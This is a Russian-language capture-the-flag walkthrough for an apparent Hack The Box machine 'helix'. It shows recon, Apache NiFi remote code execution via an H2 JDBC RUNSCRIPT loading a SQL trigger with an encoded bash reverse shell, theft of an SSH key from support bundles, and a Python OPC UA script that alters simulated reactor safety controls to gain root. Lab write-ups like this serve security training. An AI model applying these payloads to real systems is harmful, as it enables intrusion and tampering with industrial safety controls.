```Shell
┌──(neldi24㉿nelVM)-[~/Desktop]
└─$ nmap -sSVC -A 10.129.245.123   
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-14 02:05 +07
Nmap scan report for 10.129.245.123
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
|_  256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://helix.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   217.61 ms 10.10.14.1
2   217.67 ms 10.129.245.123

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.90 seconds
```

```Shell
┌──(neldi24㉿nelVM)-[~/Desktop]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \ 
     -u http://helix.htb \
     -H "Host: FUZZ.helix.htb" -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://helix.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.helix.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 1349ms]
:: Progress: [114442/114442] :: Job [1/1] :: 197 req/sec :: Duration: [0:09:56] :: Errors: 0 ::
```
Находим сабдомен flow и переходим туда

![[Pasted image 20260514002942.png]]
Получаем Shell:
1. Запустить слушатель
```Shell
nc -lvnp 4444
```
2. Создай файл rce.sql:
```SQL
CREATE TRIGGER pwn BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTQvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}");
$$--=x
```
3. Запустить HTTP-сервер в папке с rce.sql:
```Shell
python3 -m http.server 8000
```
4. В NiFi UI сделать следующее:
- Configure -> Перейти во вкладку **Controller Services** -> Нажать **+** → выбрать **DBCPConnectionPool** → Add.
После чего его надо настроить так: 
- Name: pwned (или любое)
**Properties:**
- **Database Driver Class Name**: org.h2.Driver
- **Database Driver Location**: /opt/nifi-1.21.0/lib/h2-2.1.214.jar
- **Database Connection URL**:
```text
jdbc:h2:file:/tmp/pwn;TRACE_LEVEL_SYSTEM_OUT=0;INIT=RUNSCRIPT FROM 'http://10.10.14.214:8000/rce.sql'
```
5. Включить (Enable) этот Controller Service
6. Вернутся к процессору **ExecuteSQL** → Configure → в свойствах выбрать свой новый **DBCPConnectionPool** (pwned)
7. Запустить процессор **ExecuteSQL** 

Должно прилететь на nc.
![[Pasted image 20260514012843.png]]
```Shell
find / -name "*support-bundle*" 2>/dev/null 
ls -la /opt/nifi-1.21.0/support-bundles/
```
Находим приватный ключ от оператора и копируем на свою машину
![[Pasted image 20260514014114.png]]
Используя ключ подключаемся к оператору 
![[Pasted image 20260514014305.png]]
Забираем user flag
![[Pasted image 20260514014349.png]]
User flag: `1396831e253050d8cae72d9c331a2a79`

# Privilege Escalation 
В домашнем каталоге пользователя operator мы нашли pdf с документацией, которую забрали себе 
```Shell
scp -i operator_key operator@flow.helix.htb:/home/operator/Operator\ Control\ \&\ Safety\ Guide.pdf
```
![[Pasted image 20260514014714.png]]
Пароль от документа: operator1

После чего используем payload и получаем root со второго шела:
```Python
import asyncio
from asyncua import Client, ua

URL = "opc.tcp://127.0.0.1:4840/helix/"

async def main():
    async with Client(url=URL) as c:
        ns = await c.get_namespace_index("urn:helix:ot")
        N = lambda i: c.get_node(f"ns={ns};i={i}")

        # Узлы
        Mode, TestOv, Calib = N(12), N(13), N(6)
        Rods, Cooling, Reset = N(8), N(9), N(14)
        Temp, Trip = N(4), N(10)

        print("[*] ШАГ 1: Аварийное охлаждение реактора...")
        await Rods.write_value(ua.Variant(True, ua.VariantType.Boolean))
        await Cooling.write_value(ua.Variant(True, ua.VariantType.Boolean))
        await Calib.write_value(ua.Variant(0.0, ua.VariantType.Double)) # Сбрасываем офсет
        
        print("[*] Ждем падения температуры ниже 285...")
        while True:
            t = await Temp.read_value()
            tr = await Trip.read_value()
            print(f"  > Текущая T: {t:.2f} | Trip: {tr}", end="\r")
            if t < 285:
                break
            await asyncio.sleep(2)

        print("\n[+] Температура в норме. Сбрасываем Trip...")
        await Reset.write_value(ua.Variant(True, ua.VariantType.Boolean))
        await asyncio.sleep(1)

        print("[*] ШАГ 2: Подготовка к открытию окна...")
        await Mode.write_value(ua.Variant("MAINTENANCE", ua.VariantType.String))
        await TestOv.write_value(ua.Variant(True, ua.VariantType.Boolean))

        print("[*] ШАГ 3: Финальный офсет (+20)...")
        await Calib.write_value(ua.Variant(20.0, ua.VariantType.Double))
        await asyncio.sleep(2)

        t = await Temp.read_value()
        tr = await Trip.read_value()
        if t >= 295 and not tr:
            print(f"\n[!!!] УСПЕХ! T={t:.2f}, Trip={tr}")
            print("[!!!] БЕГИ В ТЕРМИНАЛ И ПИШИ: sudo /usr/local/sbin/helix-maint-console")
            while True: await asyncio.sleep(10)
        else:
            print(f"\n[-] Что-то пошло не так: T={t:.2f}, Trip={tr}")

asyncio.run(main())
```
![[Pasted image 20260514131153.png]]

![[Pasted image 20260514131225.png]]
Root flag `339dfc903ead867f89757da374606ebb`